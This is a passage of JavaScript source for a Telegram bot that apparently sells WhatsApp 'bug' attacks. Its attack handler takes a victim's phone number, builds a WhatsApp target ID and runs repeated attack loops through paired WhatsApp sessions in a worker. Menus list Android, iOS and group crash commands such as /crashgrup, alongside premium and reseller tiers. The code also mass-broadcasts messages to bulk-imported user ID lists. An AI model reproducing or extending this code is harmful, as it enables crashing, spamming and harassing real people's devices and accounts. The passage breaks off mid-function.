                        await S7.sendMessage(chatId, `<tg-emoji emoji-id="5123248930124989216">✅</tg-emoji> *IMPORT SUCCESSFUL*\n\n<tg-emoji emoji-id="5197429921634346862">➕</tg-emoji> Added: ${result.added}\n<tg-emoji emoji-id="5456140674028019486">🔄</tg-emoji> Updated: ${result.updated}\n<tg-emoji emoji-id="5433758796289685818">👥</tg-emoji> Total: ${result.total}`, { parse_mode: 'HTML' });
                    } catch (err) {
                        delete pendingUserImport[userId];
                        S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">❌</tg-emoji> Import error: ${err.message}`);
                    }
                    return;
                }
            };

            const wizardHandler = async (msg) => {
                const userId = msg.from.id.toString();
                const chatId = msg.chat.id.toString();
                if (pendingTxtImport[userId]) {
                    delete pendingTxtImport[userId];
                    let textContent = null;
                    if (msg.text) textContent = msg.text.trim();
                    if (msg.document) {
                        const fileName = msg.document.file_name || '';
                        if (!fileName.toLowerCase().endsWith('.txt')) return S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">❌</tg-emoji> Only .txt files.`, { parse_mode: 'HTML' });
                        try {
                            textContent = await downloadTelegramFile(S7, msg.document.file_id, token);
                            await S7.sendMessage(chatId, `<tg-emoji emoji-id="5260450573768990626">📄</tg-emoji> Downloaded <b>${fileName}</b> (${textContent.length} chars)`);
                        } catch (err) { return S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">❌</tg-emoji> Download failed: ${err.message}`); }
                    }
                    if (!textContent) return;
                    const parsedUsers = userManager.parseTxtUserList(textContent);
                    if (parsedUsers.length === 0) return S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">❌</tg-emoji> *No valid users found*`, { parse_mode: 'HTML' });
                    const existingUsers = userManager.getAllUsers();
                    const existingIds = new Set(existingUsers.map(u => u.userId));
                    const newUsers = [];
                    let skipped = 0;
                    for (const pu of parsedUsers) {
                        if (existingIds.has(pu.userId)) skipped++;
                        else newUsers.push({ userId: pu.userId, chatId: pu.userId, name: pu.username || 'Unknown', username: pu.username || '', firstSeen: new Date().toLocaleString(), lastSeen: new Date().toLocaleString(), status: 'free' });
                    }
                    if (newUsers.length === 0) return S7.sendMessage(chatId, `<tg-emoji emoji-id="5447644880824181073">⚠️</tg-emoji> *NO NEW USERS*\n\nParsed: ${parsedUsers.length}\nAlready: ${skipped}\nNew: 0`, { parse_mode: 'HTML' });
                    userManager.bulkImportUsers(newUsers);
                    pendingBroadcastData[userId] = { userIds: newUsers.map(u => u.userId), parsedCount: parsedUsers.length, newCount: newUsers.length, skippedCount: skipped };
                    pendingBroadcastMsg[userId] = { step: 'awaiting_message', chatId };
                    await S7.sendMessage(chatId, `<tg-emoji emoji-id="5123248930124989216">✅</tg-emoji> *TXT PARSED*\n\n<tg-emoji emoji-id="5260450573768990626">📊</tg-emoji> Parsed: ${parsedUsers.length}\n<tg-emoji emoji-id="5197429921634346862">➕</tg-emoji> New: ${newUsers.length}\n<tg-emoji emoji-id="5456140674028019486">⏭</tg-emoji> Skipped: ${skipped}\n\n<tg-emoji emoji-id="5456140674028019486">📨</tg-emoji> Send message for ${newUsers.length} users or type <b>skip</b>`, { parse_mode: 'HTML' });
                    return;
                }
                if (pendingBroadcastMsg[userId]) {
                    const broadcastData = pendingBroadcastData[userId];
                    if (!broadcastData) { delete pendingBroadcastMsg[userId]; return; }
                    delete pendingBroadcastMsg[userId];
                    delete pendingBroadcastData[userId];
                    if (msg.text && msg.text.trim().toLowerCase() === 'skip') {
                        return S7.sendMessage(chatId, `<tg-emoji emoji-id="5123248930124989216">✅</tg-emoji> *DONE*\n\n<tg-emoji emoji-id="5433758796289685818">👥</tg-emoji> Added: ${broadcastData.newCount}\n<tg-emoji emoji-id="5456140674028019486">📨</tg-emoji> No message sent`, { parse_mode: 'HTML' });
                    }
                    let success = 0, failed = 0;
                    const failedUserIds = [];
                    const replyMsg = msg.reply_to_message;
                    const startMsg = await S7.sendMessage(chatId, `<tg-emoji emoji-id="5456140674028019486">🔄</tg-emoji> *BROADCAST STARTED*\n\n<tg-emoji emoji-id="5433758796289685818">👥</tg-emoji> Total: ${broadcastData.userIds.length}`, { parse_mode: 'HTML' }).catch(() => null);
                    let lastUpdate = 0;
                    for (let i = 0; i < broadcastData.userIds.length; i++) {
                        const bid = broadcastData.userIds[i];
                        let sendSuccess = false, errorMsg = '';
                        try {
                            if (replyMsg) {
                                if (replyMsg.photo) await S7.sendPhoto(bid, replyMsg.photo[replyMsg.photo.length - 1].file_id, { caption: replyMsg.caption || '', parse_mode: 'HTML' });
                                else if (replyMsg.video) await S7.sendVideo(bid, replyMsg.video.file_id, { caption: replyMsg.caption || '', parse_mode: 'HTML' });
                                else if (replyMsg.document) await S7.sendDocument(bid, replyMsg.document.file_id, { caption: replyMsg.caption || '', parse_mode: 'HTML' });
                                else if (replyMsg.text) await S7.sendMessage(bid, replyMsg.text, { parse_mode: 'HTML' });
                            } else if (msg.text) await S7.sendMessage(bid, msg.text, { parse_mode: 'HTML' });
                            else if (msg.photo) await S7.sendPhoto(bid, msg.photo[msg.photo.length - 1].file_id, { caption: msg.caption || '', parse_mode: 'HTML' });
                            else if (msg.video) await S7.sendVideo(bid, msg.video.file_id, { caption: msg.caption || '', parse_mode: 'HTML' });
                            else if (msg.document) await S7.sendDocument(bid, msg.document.file_id, { caption: msg.caption || '', parse_mode: 'HTML' });
                            sendSuccess = true;
                        } catch (err) { errorMsg = err.message || 'Unknown'; sendSuccess = false; }
                        if (sendSuccess) {
                            success++;
                            console.log(`${colors.green}✅ [${i+1}/${broadcastData.userIds.length}] SENT → ${bid}${colors.reset}`);
                        } else {
                            failed++;
                            failedUserIds.push(bid);
                            console.log(`${colors.red}❌ [${i+1}/${broadcastData.userIds.length}] FAILED → ${bid} | ${errorMsg}${colors.reset}`);
                        }
                        const now = Date.now();
                        if ((i + 1) % 100 === 0 || (now - lastUpdate) > 10000) {
                            lastUpdate = now;
                            if (startMsg) {
                                S7.editMessageText(`<tg-emoji emoji-id="5456140674028019486">🔄</tg-emoji> *BROADCAST*\n\n<tg-emoji emoji-id="4918408122868958076">📊</tg-emoji> ${i+1}/${broadcastData.userIds.length}\n<tg-emoji emoji-id="5123248930124989216">✅</tg-emoji> ${success} | <tg-emoji emoji-id="5974083768233760323">❌</tg-emoji> ${failed}`, { chat_id: chatId, message_id: startMsg.message_id, parse_mode: 'HTML' }).catch(() => {});
                            }
                        }
                        await sleep(50);
                    }
                    if (failedUserIds.length > 0) {
                        const userData = userManager.loadUsers();
                        const failedSet = new Set(failedUserIds);
                        userData.users = userData.users.filter(u => !failedSet.has(u.userId));
                        userManager.saveUsers(userData);
                    }
                    const finalText = `<tg-emoji emoji-id="5123248930124989216">✅</tg-emoji> *BROADCAST COMPLETE*\n\n<tg-emoji emoji-id="5433758796289685818">👥</tg-emoji> Total: ${broadcastData.userIds.length}\n<tg-emoji emoji-id="5123248930124989216">✅</tg-emoji> Success: ${success}\n<tg-emoji emoji-id="5974083768233760323">❌</tg-emoji> Failed: ${failed}\n<tg-emoji emoji-id="5974083768233760323">🗑</tg-emoji> Removed: ${failedUserIds.length}`;
                    if (startMsg) {
                        await S7.editMessageText(finalText, { chat_id: chatId, message_id: startMsg.message_id, parse_mode: 'HTML' }).catch(async () => {
                            await S7.sendMessage(chatId, finalText, { parse_mode: 'HTML' });
                        });
                    } else {
                        await S7.sendMessage(chatId, finalText, { parse_mode: 'HTML' });
                    }
                    return;
                }
                if (pendingUserImport[userId]) {
                    delete pendingUserImport[userId];
                    await wizardUserImport(msg);
                    return;
                }
                if (!msg.text) return;
                if (pendingCmdBuilder[userId]) { await wizardAddNewCmd(msg); return; }
                if (pendingChangeLoop[userId]) { await wizardChangeLoop(msg); return; }
            };

            const commandRegistry = new Map();
            function SYLoVe(commands, callback) {
                if (!Array.isArray(commands)) commands = [commands];
                for (const cmd of commands) {
                    commandRegistry.set(cmd.toLowerCase(), callback);
                }
            }

            // ==================== MESSAGE HANDLER ====================
            S7.on('message', (msg) => {
                console.log(`[RAW] ${msg.from?.id} → ${msg.text || '[media]'}`);
            });

            S7.on('message', async (msg) => {
                try {
                    if (!msg.text && !msg.document && !msg.photo && !msg.video) return;
                    const userId = msg.from?.id?.toString();
                    if (!userId) return;
                    const messageId = msg.message_id;
                    if (isDuplicateMessage(messageId)) return;
                    const text = msg.text || '';
                    const isCommand = text.startsWith('/');

                    if (!isCommand) {
                        if (pendingTxtImport[userId] && (msg.text || msg.document)) { wizardHandler(msg); return; }
                        if (pendingBroadcastMsg[userId] && (msg.text || msg.document || msg.photo || msg.video || msg.reply_to_message)) { wizardHandler(msg); return; }
                        if (pendingUserImport[userId] && (msg.text || msg.document)) { wizardHandler(msg); return; }
                        if ((pendingCmdBuilder[userId] || pendingChangeLoop[userId]) && msg.text) { wizardHandler(msg); return; }
                        return;
                    }

                    const cmd = text.trim().split(' ')[0].slice(1).toLowerCase();
                    if (!cmd) return;
                    const handler = commandRegistry.get(cmd);
                    if (handler) {
                        const name = msg.from.first_name || msg.from.username || "Unknown";
                        log('command', name, msg.text);
                        try { await handler(msg); } catch (err) { console.error(`[CMD ERROR] /${cmd}:`, err); }
                    }
                } catch (err) {
                    console.error('[MSG HANDLER ERROR]', err);
                }
            });

            S7.getMe().then((botInfo) => {
                log('success', null, `Bot Started: ${botInfo.first_name} (@${botInfo.username})`);
                if (token === config.mainToken) AutoLovingWithSY(S7);
            }).catch(async (err) => {
                if (err.message.includes('404') || err.message.includes('401')) await S7Naverdead(token, err.message);
            });

            S7.on('polling_error', (error) => {
                console.log(`[POLLING ERROR] ${error.code}: ${error.message}`);
            });

            // ==================== ATTACK HANDLER ====================
            function attackHandler(commandName, attackType, defaultCount = 20) {
                SYLoVe(commandName, async (msg) => {
                    const chatId = msg.chat.id.toString();
                    const userId = msg.from.id.toString();
                    const args = msg.text.split(' ');
                    const targetNum = args[1];
                    if (!targetNum) return S7.sendMessage(chatId, `<tg-emoji emoji-id="5447644880824181073">⚠️</tg-emoji> Usage: /${commandName} [number]\nExample: /${commandName} 628123456789`, { parse_mode: "HTML" });
                    const remaining = isOnCooldown(userId);
                    if (remaining > 0) {
                        const mins = Math.floor(remaining / 60);
                        const secs = remaining % 60;
                        return S7.sendMessage(chatId, `<tg-emoji emoji-id="5456140674028019486">⏳</tg-emoji> Cooldown: ${mins}m ${secs}s`, { parse_mode: "HTML" });
                    }
                    if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
                    const session = GetSessionForUser(userId, chatId);
                    if (session.error) return S7.sendMessage(chatId, session.error, { parse_mode: "HTML" });
                    const cleanTarget = targetNum.replace(/[^0-9]/g, '');
                    if (cleanTarget.length < 10) return S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">❌</tg-emoji> Invalid number`, { parse_mode: "HTML" });
                    const targetJid = `${cleanTarget}@s.whatsapp.net`;
                    let authPath = session.authPath;
                    if (!authPath) {
                        for (const [chat, sessions] of Object.entries(waSessions)) {
                            if (Array.isArray(sessions)) {
                                const found = sessions.find(s => s.sock === session.sock);
                                if (found) { authPath = `./Love/auth/${chat}/${found.num}`; break; }
                            }
                        }
                    }
                    if (!authPath || !fs.existsSync(authPath)) return S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">❌</tg-emoji> Session auth path not found`, { parse_mode: "HTML" });
                    setCooldown(userId);
                    const dynamicCount = cmdBuilder.getLoopCount(commandName, defaultCount);
                    const count = args[2] ? parseInt(args[2]) : dynamicCount;
                    const commandDisplay = commandName.charAt(0).toUpperCase() + commandName.slice(1);
                    S7.sendPhoto(chatId, LoveLogo, { caption: BvgSYLoVe(cleanTarget), parse_mode: "HTML" }).catch(() => {
                        S7.sendMessage(chatId, BvgSYLoVe(cleanTarget), { parse_mode: "HTML" }).catch(() => {});
                    });
                    runAttackInWorker(attackType, authPath, targetJid, count, chatId, commandDisplay, cleanTarget, S7);
                });
            }

            // ==================== CALLBACK QUERY ====================
            S7.on('callback_query', async (query) => {
                const chatId = query.message.chat.id;
                const messageId = query.message.message_id;
                const data = query.data;
                const name = query.from.username ? `@${query.from.username}` : query.from.first_name;
                const uptime = getRuntime();
                const userId = query.from.id.toString();
                const isOwner = userId === config.adminId.toString();
                try {
                    if (data === 'check_join') {
                        const joinStatus = await isUserJoined(S7, userId);
                        if (joinStatus.joined) {
                            await S7.answerCallbackQuery(query.id, { text: '✅ Verified! Now use /start.', show_alert: true });
                        } else {
                            let missing = [];
                            if (!joinStatus.channel) missing.push('Channel');
                            if (!joinStatus.group) missing.push('Group');
                            await S7.answerCallbackQuery(query.id, {
                                text: `❌ You haven't joined yet!\n\nMissing: ${missing.join(' + ')}`,
                                show_alert: true
                            });
                        }
                        return;
                    }

                    // ==================== CONFIRM / CANCEL DELALLPREM ====================
                    if (data === 'confirm_delallprem') {
                        if (!isOwner) return S7.answerCallbackQuery(query.id, { text: 'Not authorized!', show_alert: true }).catch(() => {});
                        let db = getDB();
                        const removedCount = db.premium.length;
                        db.premium = [];
                        saveDB(db);
                        await S7.answerCallbackQuery(query.id, { text: `✅ Removed ${removedCount} premium users!`, show_alert: true }).catch(() => {});
                        return S7.editMessageText(
                            `<tg-emoji emoji-id="5123248930124989216">✅</tg-emoji> *ALL PREMIUM REMOVED*\n\n` +
                            `<tg-emoji emoji-id="5974083768233760323">🗑</tg-emoji> Removed: <b>${removedCount}</b> users\n` +
                            `<tg-emoji emoji-id="5260450573768990626">📊</tg-emoji> Premium list is now empty.`,
                            { chat_id: chatId, message_id: messageId, parse_mode: 'HTML' }
                        ).catch(() => {});
                    }

                    if (data === 'cancel_delallprem') {
                        if (!isOwner) return S7.answerCallbackQuery(query.id, { text: 'Not authorized!', show_alert: true }).catch(() => {});
                        await S7.answerCallbackQuery(query.id, { text: '❌ Cancelled', show_alert: false }).catch(() => {});
                        return S7.editMessageText(
                            `<tg-emoji emoji-id="5974083768233760323">❌</tg-emoji> *CANCELLED*\n\nNo premium users were removed.`,
                            { chat_id: chatId, message_id: messageId, parse_mode: 'HTML' }
                        ).catch(() => {});
                    }

                    if (data.startsWith('removecmd_')) {
                        if (!isOwner) return S7.answerCallbackQuery(query.id, { text: 'Not authorized!', show_alert: true }).catch(() => {});
                        const cmdName = data.replace('removecmd_', '');
                        if (cmdName === 'cancel') { await S7.answerCallbackQuery(query.id).catch(() => {}); return S7.editMessageText(`<tg-emoji emoji-id="5974083768233760323">❌</tg-emoji> Cancelled.`, { chat_id: chatId, message_id: messageId, parse_mode: 'HTML' }).catch(() => {}); }
                        await S7.answerCallbackQuery(query.id).catch(() => {});
                        const result = cmdBuilder.removeCommand(cmdName);
                        if (!result.success) return S7.editMessageText(`<tg-emoji emoji-id="5974083768233760323">❌</tg-emoji> Failed: ${result.error}`, { chat_id: chatId, message_id: messageId, parse_mode: 'HTML' }).catch(() => {});
                        await S7.editMessageText(`<tg-emoji emoji-id="5123248930124989216">✅</tg-emoji> *REMOVED!*\n\n<tg-emoji emoji-id="5260450573768990626">📋</tg-emoji> /${result.cmdName}\n<tg-emoji emoji-id="5447644880824181073">⚠️</tg-emoji> Restart bot.`, { chat_id: chatId, message_id: messageId, parse_mode: 'HTML' }).catch(() => {});
                        return;
                    }
                    if (data.startsWith('changeloop_')) {
                        if (!isOwner) return S7.answerCallbackQuery(query.id, { text: 'Not authorized!', show_alert: true }).catch(() => {});
                        const cmdName = data.replace('changeloop_', '');
                        if (cmdName === 'cancel') { await S7.answerCallbackQuery(query.id).catch(() => {}); return S7.editMessageText(`<tg-emoji emoji-id="5974083768233760323">❌</tg-emoji> Cancelled.`, { chat_id: chatId, message_id: messageId, parse_mode: 'HTML' }).catch(() => {}); }
                        await S7.answerCallbackQuery(query.id).catch(() => {});
                        const commands = cmdBuilder.getAllCommandsWithBuiltIn();
                        const cmdInfo = commands.find(c => c.cmdName === cmdName);
                        if (!cmdInfo) return S7.editMessageText(`<tg-emoji emoji-id="5974083768233760323">❌</tg-emoji> Command not found.`, { chat_id: chatId, message_id: messageId, parse_mode: 'HTML' }).catch(() => {});
                        pendingChangeLoop[userId] = { cmdName, oldCount: cmdInfo.count, step: 'awaiting_loop', chatId };
                        await S7.editMessageText(`<tg-emoji emoji-id="4918408122868958076">🔁</tg-emoji> *CHANGE LOOP*\n\n<tg-emoji emoji-id="5260450573768990626">📋</tg-emoji> /${cmdName}\n<tg-emoji emoji-id="4918408122868958076">📊</tg-emoji> Current: ${cmdInfo.count}x\n\n👉 Send new loop (1-500)`, { chat_id: chatId, message_id: messageId, parse_mode: 'HTML' }).catch(() => {});
                        return;
                    }
                    if (data === 'owner_menu') {
                        if (!isOwner) return S7.answerCallbackQuery(query.id, { text: 'Not authorized!', show_alert: true }).catch(() => {});
                        await S7.answerCallbackQuery(query.id).catch(() => {});
                        const commands = cmdBuilder.getAllCommandsWithBuiltIn();
                        const totalUsers = userManager.getUserCount();
                        let text = `<tg-emoji emoji-id="5197429921634346862">👑</tg-emoji> *OWNER MENU*\n\n<tg-emoji emoji-id="5260450573768990626">📋</tg-emoji> Commands: ${commands.length}\n<tg-emoji emoji-id="5433758796289685818">👥</tg-emoji> Users: ${totalUsers}\n\n`;
                        for (const c of commands) text += `• /${c.cmdName} — ${c.count}x\n`;
                        const newKeyboard = { inline_keyboard: [
                            [{ text: '➕ Add Command', callback_data: 'owner_add' }, { text: '🗑 Remove', callback_data: 'owner_remove' }],
                            [{ text: '🔁 Change Loop', callback_data: 'owner_changeloop' }],
                            [{ text: '📤 Export Users', callback_data: 'owner_export' }, { text: '📥 Import JSON', callback_data: 'owner_import' }],
                            [{ text: '📄 Import TXT', callback_data: 'owner_import_txt' }],
                            [{ text: '🔄 Refresh', callback_data: 'owner_menu' }, { text: '⬅️ Back', callback_data: 'main_menu' }]
                        ]};
                        return S7.editMessageCaption(text, { chat_id: chatId, message_id: messageId, parse_mode: 'HTML', reply_markup: newKeyboard }).catch(() => { S7.sendMessage(chatId, text, { parse_mode: 'HTML', reply_markup: newKeyboard }); });
                    }
                    if (data === 'owner_add') {
                        if (!isOwner) return S7.answerCallbackQuery(query.id, { text: 'Not authorized!', show_alert: true }).catch(() => {});
                        await S7.answerCallbackQuery(query.id).catch(() => {});
                        return S7.editMessageCaption(`<tg-emoji emoji-id="5197429921634346862">➕</tg-emoji> *ADD COMMAND*\n\n1️⃣ Send .js file\n2️⃣ Reply with /addnewcmd\n3️⃣ Reply to text with /addnewcmd`, { chat_id: chatId, message_id: messageId, parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '⬅️ Back', callback_data: 'owner_menu' }]] } }).catch(() => {});
                    }
                    if (data === 'owner_remove') {
                        if (!isOwner) return S7.answerCallbackQuery(query.id, { text: 'Not authorized!', show_alert: true }).catch(() => {});
                        await S7.answerCallbackQuery(query.id).catch(() => {});
                        const dynamicCmds = cmdBuilder.getAllCommands();
                        if (dynamicCmds.length === 0) return S7.editMessageCaption(`<tg-emoji emoji-id="5974083768233760323">🗑</tg-emoji> *REMOVE*\n\n<tg-emoji emoji-id="5974083768233760323">❌</tg-emoji> No custom commands.`, { chat_id: chatId, message_id: messageId, parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '⬅️ Back', callback_data: 'owner_menu' }]] } }).catch(() => {});
                        const buttons = dynamicCmds.map(cmd => ([{ text: `🗑 /${cmd.cmdName} (${cmd.defaultCount}x)`, callback_data: `removecmd_${cmd.cmdName}` }]));
                        buttons.push([{ text: '⬅️ Back', callback_data: 'owner_menu' }]);
                        return S7.editMessageCaption(`<tg-emoji emoji-id="5974083768233760323">🗑</tg-emoji> *REMOVE COMMAND*`, { chat_id: chatId, message_id: messageId, parse_mode: 'HTML', reply_markup: { inline_keyboard: buttons } }).catch(() => {});
                    }
                    if (data === 'owner_changeloop') {
                        if (!isOwner) return S7.answerCallbackQuery(query.id, { text: 'Not authorized!', show_alert: true }).catch(() => {});
                        await S7.answerCallbackQuery(query.id).catch(() => {});
                        const commands = cmdBuilder.getAllCommandsWithBuiltIn();
                        const buttons = commands.map(cmd => ([{ text: `🔁 /${cmd.cmdName} (${cmd.count}x)`, callback_data: `changeloop_${cmd.cmdName}` }]));
                        buttons.push([{ text: '⬅️ Back', callback_data: 'owner_menu' }]);
                        return S7.editMessageCaption(`<tg-emoji emoji-id="4918408122868958076">🔁</tg-emoji> *CHANGE LOOP*`, { chat_id: chatId, message_id: messageId, parse_mode: 'HTML', reply_markup: { inline_keyboard: buttons } }).catch(() => {});
                    }
                    if (data === 'owner_export') {
                        if (!isOwner) return S7.answerCallbackQuery(query.id, { text: 'Not authorized!', show_alert: true }).catch(() => {});
                        await S7.answerCallbackQuery(query.id).catch(() => {});
                        const exportData = userManager.getExportData();
                        if (exportData.users.length === 0) return S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">❌</tg-emoji> No users.`);
                        const jsonContent = JSON.stringify(exportData, null, 2);
                        const fileName = `users_export_${Date.now()}.json`;
                        const filePath = path.join(__dirname, fileName);
                        try {
                            fs.writeFileSync(filePath, jsonContent, 'utf8');
                            await S7.sendDocument(chatId, filePath, { caption: `<tg-emoji emoji-id="5123248930124989216">✅</tg-emoji> *USERS EXPORTED*\n\n<tg-emoji emoji-id="5260450573768990626">📊</tg-emoji> Total: ${exportData.stats.total}\n<tg-emoji emoji-id="5197429921634346862">👑</tg-emoji> ${exportData.stats.owner} | <tg-emoji emoji-id="5123248930124989216">💎</tg-emoji> ${exportData.stats.premium} | <tg-emoji emoji-id="5123248930124989216">🏪</tg-emoji> ${exportData.stats.reseller} | <tg-emoji emoji-id="5433758796289685818">🆓</tg-emoji> ${exportData.stats.free}`, parse_mode: 'HTML' }, { filename: fileName, contentType: 'application/json' });
                            setTimeout(() => { try { fs.unlinkSync(filePath); } catch (e) {} }, 5000);
                        } catch (err) { S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">❌</tg-emoji> Export failed: ${err.message}`); }
                        return;
                    }
                    if (data === 'owner_import') {
                        if (!isOwner) return S7.answerCallbackQuery(query.id, { text: 'Not authorized!', show_alert: true }).catch(() => {});
                        await S7.answerCallbackQuery(query.id).catch(() => {});
                        pendingUserImport[userId] = { step: 'awaiting_json', chatId };
                        return S7.sendMessage(chatId, `<tg-emoji emoji-id="5197429921634346862">📥</tg-emoji> *IMPORT JSON*\n\nSend .json file or paste JSON.`, { parse_mode: 'HTML' });
                    }
                    if (data === 'owner_import_txt') {
                        if (!isOwner) return S7.answerCallbackQuery(query.id, { text: 'Not authorized!', show_alert: true }).catch(() => {});
                        await S7.answerCallbackQuery(query.id).catch(() => {});
                        pendingTxtImport[userId] = { step: 'awaiting_txt', chatId };
                        return S7.sendMessage(chatId, `<tg-emoji emoji-id="5260450573768990626">📄</tg-emoji> *IMPORT TXT*\n\nSend .txt file or paste.`, { parse_mode: 'HTML' });
                    }

                    if (!LoveGlobalState(userId)) {
                        await S7.answerCallbackQuery(query.id, { text: 'Not authorized!', show_alert: true }).catch(() => {});
                        return sendSYLove(S7, chatId);
                    }
                    await S7.answerCallbackQuery(query.id).catch(() => {});
                    let newCaption = MainSYLoVe(name, uptime, userId);
                    let newKeyboard = null;
                    const isOwnerUser = userId === config.adminId.toString();
                    if (data === 'main_menu') {
                        const rows = [[{ text: '🐛 Bug Menu', callback_data: 'bug_menu' }, { text: '⚙️ Misc Menu', callback_data: 'misc_menu' }]];
                        if (isOwnerUser) rows.push([{ text: '👑 Owner Menu', callback_data: 'owner_menu' }]);
                        rows.push([{ text: '📢 Channel', url: config.channel }]);
                        rows.push([{ text: '👥 Group', url: config.group }]);
                        rows.push([{ text: '👤 Owner', url: 'https://t.me/smartsquardyt' }]);
                        newKeyboard = { inline_keyboard: rows };
                    } else if (data === 'bug_menu') {
                        newCaption += '\n\n<tg-emoji emoji-id="5373290243787070962">🐛</tg-emoji> Select platform:';
                        newKeyboard = { inline_keyboard: [[{ text: '🤖 Android', callback_data: 'android_menu' }, { text: '🍎 iOS', callback_data: 'ios_menu' }], [{ text: '👥 Group', callback_data: 'group_menu' }], [{ text: '🔙 Back', callback_data: 'main_menu' }]] };
                    } else if (data === 'android_menu') {
                        const allCmds = cmdBuilder.getAllCommandsWithBuiltIn().filter(c => c.platform === 'android');
                        let cmdList = '';
                        for (const c of allCmds) cmdList += `/${c.cmdName} [num] (${c.count}x)\n`;
                        newCaption += `\n\n<tg-emoji emoji-id="5454008471873669821">🤖</tg-emoji> Android:\n${cmdList}`;
                        newKeyboard = { inline_keyboard: [[{ text: '🔙 Back', callback_data: 'bug_menu' }]] };
                    } else if (data === 'ios_menu') {
                        const allCmds = cmdBuilder.getAllCommandsWithBuiltIn().filter(c => c.platform === 'ios');
                        let cmdList = '';
                        for (const c of allCmds) cmdList += `/${c.cmdName} [num] (${c.count}x)\n`;
                        newCaption += `\n\n<tg-emoji emoji-id="5235886826874492142">🍎</tg-emoji> iOS:\n${cmdList}`;
                        newKeyboard = { inline_keyboard: [[{ text: '🔙 Back', callback_data: 'bug_menu' }]] };
                    } else if (data === 'group_menu') {
                        newCaption += '\n\n<tg-emoji emoji-id="5443038326535759644">👥</tg-emoji> Group:\n/bangroup\n/crashgrup\n/listgc\n/groupid';
                        newKeyboard = { inline_keyboard: [[{ text: '🔙 Back', callback_data: 'bug_menu' }]] };
                    } else if (data === 'misc_menu') {
                        newCaption += '\n\n<tg-emoji emoji-id="6032742198179532882">⚙️</tg-emoji> Misc:\n/reqpair\n/delpair\n/sessions\n/delsession\n/restartsession\n/restartallsessions\n/addtoken\n/deltoken\n/delbot\n/listtoken\n/mytoken\n/addprem\n/delprem\n/delallprem\n/addresell\n/delresell\n/listprem\n/listresell\n/state\n/broadcast\n/broadcast1\n/listuser';
                        newKeyboard = { inline_keyboard: [[{ text: '🔙 Back', callback_data: 'main_menu' }]] };
                    } else return;
                    const currentCaption = query.message.caption || '';
                    const currentReplyMarkup = query.message.reply_markup || {};
                    if (currentCaption === newCaption && JSON.stringify(newKeyboard) === JSON.stringify(currentReplyMarkup)) return;
                    await S7.editMessageCaption(newCaption, { chat_id: chatId, message_id: messageId, parse_mode: "HTML", reply_markup: newKeyboard }).catch((err) => { if (!err.message.includes('not modified')) console.error(err); });
                } catch (err) { console.error('Callback error:', err); }
            });

            // ==================== START / HELP ====================
            SYLoVe('start', async (msg) => {
                const chatId = msg.chat.id.toString();
                const userId = msg.from.id.toString();
                const joinStatus = await isUserJoined(S7, userId);
                if (!joinStatus.joined) return sendForceJoin(S7, chatId, joinStatus);
                const name = msg.from.first_name || msg.from.username || 'User';
                const uptime = getRuntime();
                const caption = MainSYLoVe(name, uptime, userId);
                const isOwner = userId === config.adminId.toString();
                const rows = [[{ text: '🐛 Bug Menu', callback_data: 'bug_menu' }, { text: '⚙️ Misc Menu', callback_data: 'misc_menu' }]];
                if (isOwner) rows.push([{ text: '👑 Owner Menu', callback_data: 'owner_menu' }]);
                rows.push([{ text: '📢 Channel', url: config.channel }]);
                rows.push([{ text: '👥 Group', url: config.group }]);
                rows.push([{ text: '👤 Owner', url: 'https://t.me/smartsquardyt' }]);
                try {
                    await S7.sendPhoto(chatId, LoveLogo, { caption, parse_mode: "HTML", reply_markup: { inline_keyboard: rows } });
                } catch (e) {
                    await S7.sendMessage(chatId, caption, { parse_mode: "HTML", reply_markup: { inline_keyboard: rows } });
                }
            });

            SYLoVe(['help', 'menu'], async (msg) => {
                const chatId = msg.chat.id.toString();
                const userId = msg.from.id.toString();
                const joinStatus = await isUserJoined(S7, userId);
                if (!joinStatus.joined) return sendForceJoin(S7, chatId, joinStatus);
                const name = msg.from.first_name || msg.from.username || 'User';
                const uptime = getRuntime();
                const caption = MainSYLoVe(name, uptime, userId);
                const rows = [[{ text: '🐛 Bug Menu', callback_data: 'bug_menu' }, { text: '⚙️ Misc Menu', callback_data: 'misc_menu' }]];
                if (userId === config.adminId.toString()) rows.push([{ text: '👑 Owner Menu', callback_data: 'owner_menu' }]);
                rows.push([{ text: '📢 Channel', url: config.channel }]);
                rows.push([{ text: '👥 Group', url: config.group }]);
                rows.push([{ text: '👤 Owner', url: 'https://t.me/smartsquardyt' }]);
                try {
                    await S7.sendPhoto(chatId, LoveLogo, { caption, parse_mode: "HTML", reply_markup: { inline_keyboard: rows } });
                } catch (e) {
                    await S7.sendMessage(chatId, caption, { parse_mode: "HTML", reply_markup: { inline_keyboard: rows } });
                }
            });


SYLoVe(['myid', 'id', 'chatid'], async (msg) => {
    const chatId = msg.chat.id.toString();
    const userId = msg.from.id.toString();
    const name = msg.from.first_name || 'User';

    const webLink = `http://129.213.128.240:3000/login`;

    await S7.sendMessage(chatId,
        `<tg-emoji emoji-id="5433758796289685818">🆔</tg-emoji> *Your Telegram Chat ID*\n\n` +
        `<code>${userId}</code>\n\n` +
        `<tg-emoji emoji-id="5260450573768990626">📋</tg-emoji> Copy this and paste it on the website to login.\n\n` +
        `<tg-emoji emoji-id="5456140674028019486">🌐</tg-emoji> *Website:* <code>${webLink}</code>`,
        {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🔓 Open Login Page', url: webLink }],
                    [
                        { text: '📢 Channel', url: config.channel },
                        { text: '👑 Owner', url: config.ownerLink || 'https://t.me/smartsquardyt' }
                    ]
                ]
            }
        }
    );
});
            // ==================== ADD NEW CMD (TEXT + FILE) ====================
            SYLoVe('addnewcmd', async (msg) => {
                const chatId = msg.chat.id.toString();
                const userId = msg.from.id.toString();
                if (userId !== config.adminId.toString()) return S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">⛔</tg-emoji> Only owner.`);

                const replyMsg = msg.reply_to_message;
                let jsCode = null;

                if (replyMsg && replyMsg.document) {
                    const fileName = replyMsg.document.file_name || '';
